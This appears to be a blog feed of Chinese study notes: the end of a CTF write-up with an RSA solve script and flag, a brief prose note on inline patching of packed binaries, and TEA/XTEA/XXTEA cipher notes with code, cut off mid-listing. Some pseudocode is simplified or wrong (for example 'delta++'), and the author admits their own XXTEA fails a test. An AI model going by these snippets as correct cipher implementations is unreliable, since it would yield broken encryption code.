r)<br>\end{cases}<br>$$<br>根据中国剩余定理可以直接求m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知的参数</span></span><br><span class="line">c1 = <span class="number">36918910341116680090654563538246204134840776220077189276689868322808977412566781872132517635399441578464309667998925236488280867210758507758915311644529399878185776345227817559234605958783077866016808605942558810445187434690812992072238407431218047312484354859724174751718700409405142819140636116559320641695</span></span><br><span class="line">c2 = <span class="number">15601788304485903964195122196382181273808496834343051747331984997977255326224514191280515875796224074672957848566506948553165091090701291545031857563686815297483181025074113978465751897596411324331847008870832527695258040104858667684793196948970048750296571273364559767074262996595282324974180754813257013752</span></span><br><span class="line">p = <span class="number">12101696894052331138951718202838643670037274599483776996203693662637821825873973767235442427190607145999472731101517998719984942030184683388441121181962123</span></span><br><span class="line">r = <span class="number">10199001137987151966640837133782537428248507382360655526592866939552984259171772190788036403425837649697437126360866173688083643144865107648483668545682383</span></span><br><span class="line">e = <span class="number">31413537523</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#求n</span></span><br><span class="line">n = p*r</span><br><span class="line"></span><br><span class="line"><span class="comment">#求模逆元</span></span><br><span class="line">j1 = invert(r,p)</span><br><span class="line">j2 = invert(p,r)</span><br><span class="line"><span class="comment">#求a</span></span><br><span class="line">a = c1*j1*r+c2*j2*p</span><br><span class="line"><span class="comment">#开方</span></span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">last = <span class="built_in">pow</span>(a,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(last))</span><br><span class="line"><span class="comment">#b&#x27;NSSCTF&#123;yUanshEnx1ncHun2o23!&#125;FA3JmflIoai8BxgdIGUQumsNc5R0hpo53zICaiWZRfjBj59P36EwC4CSfJOsZ3LIOYnhUmsQ&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《逆核》06-内嵌补丁</title>
      <link href="/posts/9b8c0cc4.html"/>
      <url>/posts/9b8c0cc4.html</url>
      
        <content type="html"><![CDATA[<h2 id="内嵌代码补丁">内嵌代码补丁</h2><p>区别于直接修改程序代码，内嵌补丁是专门作用于有加密，校验，压缩的程序，在程序中插入内嵌补丁，并在解密解压后执行补丁内容，最后跳转到OEP，比修改加密/压缩后的代码更方便。</p><h3 id="步骤">步骤</h3><p>设置补丁的位置</p><ul><li>文件的空白区域（补丁代码少时）</li><li>扩展后的最后一个节区</li><li>添加的新节区</li></ul><p>注：添加补丁的节区一定要有可写权限，获得相应内存的可写权限</p><p>在解密后的位置（jmp OEP）写跳转语句跳到补丁位置，最后由补丁跳到OEP</p><hr><p>[施工中][QAQ]</p><hr><p>第二部分：完</p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程核心原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 学习 </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加密02:TEA</title>
      <link href="/posts/d89283b5.html"/>
      <url>/posts/d89283b5.html</url>
      
        <content type="html"><![CDATA[<h1>Tiny Encryption Algorithm</h1><p>（微型加密算法）</p><h2 id="性质">性质</h2><p>块加密，对称加密</p><ul><li>块加密：将明文按一定大小分组之后用确定的算法和对称密钥对魅族分别加密，一般来说加密和解密函数为反函数，一般会进行多轮加密</li><li>对称加密：加密解密双方使用同一个密钥加密解密或双方使用的是两个可以简单地相互推算的密钥</li></ul><h2 id="过程">过程</h2><h3 id="定义与初始化">定义与初始化</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = [a,b,c,d]<span class="comment">#一般是4个值</span></span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br></pre></td></tr></table></figure><h3 id="轮加密">轮加密</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">0</span>,<span class="built_in">len</span>(m),<span class="number">2</span>):</span><br><span class="line">x = m[i]</span><br><span class="line">y = m[i+<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">delta++</span><br><span class="line">x += ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + delta) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>])</span><br><span class="line">y += ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + delta) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><p>注：具体算法可能不同，但是一般都是x 由y和key改变，y由x和key改变，delta可能加可能减,但是一般情况不会把for i in (0,len(m),2)改成for i in (len-1)，这样就不是块加密了</p><p>此处省略了&amp;0xffffffff，需要让所有值都是int/dword，下面也是，之后不说了</p><hr><p>XTEA的加密部分：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    x += (((y &lt;&lt; <span class="number">4</span>) ^ (y &gt;&gt; <span class="number">5</span>)) + y) ^ (delta + key[delta &amp; <span class="number">3</span>])</span><br><span class="line">    delta++</span><br><span class="line">    y += (((x &lt;&lt; <span class="number">4</span>) ^ (x &gt;&gt; <span class="number">5</span>)) + x) ^ (delta + key[(delta&gt;&gt;<span class="number">11</span>) &amp; <span class="number">3</span>])</span><br></pre></td></tr></table></figure><p>注；相当于添加了与和位移,让key的取值不固定,但是框架没啥区别</p><hr><p>XXTEA的加密部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">round</span> = <span class="number">6</span> + <span class="number">52</span> // n <span class="comment">#n为数据个数（输入数组长度）,长度可以不是4的倍数</span></span><br><span class="line">MX = <span class="keyword">lambda</span> <span class="built_in">sum</span>, y, z, p, e, k: ((z &gt;&gt; <span class="number">5</span> ^ y &lt;&lt; <span class="number">2</span>) + (y &gt;&gt; <span class="number">3</span> ^ z &lt;&lt; <span class="number">4</span>)) ^ ((<span class="built_in">sum</span> ^ y) + (k[p &amp; <span class="number">3</span> ^ e] ^ z))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">round</span>):</span><br><span class="line"><span class="built_in">sum</span> = (<span class="built_in">sum</span> + DELTA) &amp; <span class="number">0xffffffff</span></span><br><span class="line">e = <span class="built_in">sum</span> &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">y = m[(p + <span class="number">1</span>) % n]</span><br><span class="line">z = m[p] = (m[p] + MX(<span class="built_in">sum</span>, y, z, p, e, k)) &amp; <span class="number">0xffffffff</span></span><br></pre></td></tr></table></figure><p>贴一个c语言版</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//也不知道网上都写的啥，看都看不懂//终于看懂了，好耶</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x9e3779b9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;5^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xxtea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span>* key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> y, z, sum;</span><br><span class="line">    <span class="type">unsigned</span> p, rounds, e;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">1</span>)             <span class="comment">// encrypt</span></span><br><span class="line">    &#123;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = <span class="number">0</span>;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            sum += DELTA;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=<span class="number">0</span>; p&lt;n<span class="number">-1</span>; p++)</span><br><span class="line">            &#123;</span><br><span class="line">                y = v[p+<span class="number">1</span>];</span><br><span class="line">                z = v[p] += MX;</span><br><span class="line">            &#125;</span><br><span class="line">            y = v[<span class="number">0</span>];</span><br><span class="line">            z = v[n<span class="number">-1</span>] += MX;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">-1</span>)      <span class="comment">// decrypt</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = -n;</span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">        sum = rounds * DELTA;</span><br><span class="line">        y = v[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">            &#123;</span><br><span class="line">                z = v[p<span class="number">-1</span>];</span><br><span class="line">                y = v[p] -= MX;</span><br><span class="line">            &#125;</span><br><span class="line">            z = v[n<span class="number">-1</span>];</span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">            sum -= DELTA;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (--rounds);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 两个32位无符号整数，即待加密的64bit明文数据</span></span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">2</span>] = &#123;<span class="number">0x12345678</span>, <span class="number">0x78563412</span>&#125;;</span><br><span class="line">    <span class="comment">// 四个32位无符号整数，即128bit的key</span></span><br><span class="line">    <span class="type">uint32_t</span> k[<span class="number">4</span>]= &#123;<span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x4</span>&#125;;</span><br><span class="line">    <span class="comment">//n的绝对值表示v的长度，取正表示加密，取负表示解密</span></span><br><span class="line">    <span class="type">int</span> n = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    xxtea(v, n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Encrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line">    xxtea(v, -n, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Decrypted data is : %x %x\n&quot;</span>, v[<span class="number">0</span>], v[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修正：XXTEA和前面两个的区别在于：</p><p>前两个加密只是两个两个地相互加密，但是xxtea是用前一个值和后一个值加密这个位，按每个都加密一遍算一轮，一共进行round轮,这里放一个我理解的XXTEA，根据网上的测试，都是一样的，但是不知道为什么如果用我的测试样例就过不了（网上的版本会失效）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Arr.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">XXTEA</span><span class="params">(Arr&amp; input, <span class="type">uint32_t</span>* <span class="type">const</span> key)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"><span class="type">uint32_t</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="type">uint32_t</span> len = input.<span class="built_in">getsize</span>();</span><br><span class="line"><span class="type">uint32_t</span> round = <span class="number">52</span> / len + <span class="number">6</span>;</span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; round; i++)</span><br><span class="line">&#123;</span><br><span class="line">sum += delta;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> now = <span class="number">0</span>; now &lt; len; now++)</span><br><span class="line">&#123;</span><br><span class="line">input[now] += (((input[now - <span class="number">1</span>] &gt;&gt; <span class="number">5</span> ^ input[now + <span class="number">1</span>] &lt;&lt; <span class="number">2</span>) +</span><br><span class="line">(input[now + <span class="number">1</span>] &gt;&gt; <span class="number">3</span> ^ input[now - <span class="number">1</span>] &lt;&lt; <span class="number">4</span>)) ^ ((sum ^ input[now + <span class="number">1</span>]) +</span><br><span class="line">(key[(now &amp; <span class="number">3</span>) ^ ((sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>)] ^ input[now - <span class="number">1</span>])));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">deXXTEA</span><span class="params">(Arr&amp; input, <span class="type">uint32_t</span>* <span class="type">const</span> key)</span> </span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line"><span class="type">uint32_t</span> len = input.<span class="built_in">getsize</span>();</span><br><span class="line"><span class="type">uint32_t</span> round = <span class="number">52</span> / len + <span class="number">6</span>;</span><br><span class="line"><span class="type">uint32_t</span> sum = delta * round;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; round; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> now = len - <span class="number">1</span>; now &gt; <span class="number">-1</span>; now--)</span><br><span class="line">&#123;</span><br><span class="line">input[now] -= (((input[now - <span class="number">1</span>] &gt;&gt; <span class="number">5</span> ^ input[now + <span class="number">1</span>] &lt;&lt; <span class="number">2</span>) +</span><br><span class="line">(input[now + <span class="number">1</span>] &gt;&gt; <span class="number">3</span> ^ input[now - <span class="number">1</span>] &lt;&lt; <span class="number">4</span>)) ^ ((sum ^ input[now + <span class="number">1</span>]) +</span><br><span class="line">(key[(now &amp; <span class="number">3</span>) ^ ((sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>)] ^ input[now - <span class="number">1</span>])));</span><br><span class="line">&#125;</span><br><span class="line">sum -= delta;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="comment">//Arr test = &#123; 0x1234,0x5678,0x7777,0xbead &#125;;</span></span><br><span class="line">Arr* test = <span class="keyword">new</span> <span class="built_in">Arr</span>((<span class="type">uint32_t</span>*)<span class="string">&quot;HELLO_MESSAGE_he&quot;</span>, <span class="number">4</span>);<span class="comment">//XXTEA要求必须是4的倍数</span></span><br><span class="line"><span class="comment">//Arr test = &#123; 1,2 &#125;;</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="type">const</span> key[<span class="number">4</span>] = &#123; <span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">XXTEA</span>(*test, (<span class="type">uint32_t</span>*)key);</span><br><span class="line">std::cout &lt;&lt; *test;</span><br><span class="line"><span class="built_in">deXXTEA</span>(*test, (<span class="type">uint32_t</span>*)key);</span><br><span class="line">std::cout &lt;&lt; *test;</span><br><span class="line">std::cout &lt;&lt; (<span class="type">char</span>*)test-&gt;<span class="built_in">getarr</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Arr.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;initializer_list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Arr</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">size_t</span> size;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>* arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Arr</span>(<span class="type">size_t</span> s);</span><br><span class="line"><span class="built_in">Arr</span>(<span class="type">uint32_t</span>* p, <span class="type">unsigned</span> s);</span><br><span class="line"><span class="built_in">Arr</span>(std::initializer_list&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; init);</span><br><span class="line">~<span class="built_in">Arr</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">getsize</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">getarr</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">friend</span> std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; os, <span class="type">const</span> Arr&amp; obj);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>&amp; <span class="keyword">operator</span>[](<span class="type">unsigned</span> i);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">begin</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">end</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Arr.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Arr.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(<span class="type">size_t</span> s) : <span class="built_in">size</span>(s), <span class="built_in">arr</span>(<span class="keyword">new</span> <span class="type">uint32_t</span>[s]) &#123;</span><br><span class="line">std::<span class="built_in">fill_n</span>(arr, s, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(<span class="type">uint32_t</span>* p, <span class="type">unsigned</span> s) : <span class="built_in">Arr</span>(s)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">&#123;</span><br><span class="line">arr[i] = p[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Arr::<span class="built_in">Arr</span>(std::initializer_list&lt;<span class="type">unsigned</span> <span class="type">int</span>&gt; init) :<span class="built_in">size</span>(init.<span class="built_in">size</span>()), <span class="built_in">arr</span>(<span class="keyword">new</span> <span class="type">unsigned</span> <span class="type">int</span>[init.<span class="built_in">size</span>()])</span><br><span class="line">&#123;</span><br><span class="line">std::<span class="built_in">copy</span>(init.<span class="built_in">begin</span>(), init.<span class="built_in">end</span>(), arr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Arr::~<span class="built_in">Arr</span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span>[] arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span> <span class="title">Arr::getsize</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::getarr</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>&amp; Arr::<span class="keyword">operator</span>[](<span class="type">unsigned</span> i)</span><br><span class="line">&#123;</span><br><span class="line">i = (i + size) % size;</span><br><span class="line">i = i &gt;= <span class="number">0</span> ? i : (i + size);</span><br><span class="line"><span class="keyword">return</span> arr[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::begin</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">int</span>* <span class="title">Arr::end</span><span class="params">()</span> <span class="type">const</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> arr + size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::ostream&amp; <span class="keyword">operator</span>&lt;&lt;(std::ostream&amp; os, <span class="type">const</span> Arr&amp; obj)</span><br><span class="line">&#123;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;len: &quot;</span> &lt;&lt; obj.<span class="built_in">getsize</span>() &lt;&lt; std::endl;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;element list:&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> i : obj) &#123;</span><br><span class="line">os &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; 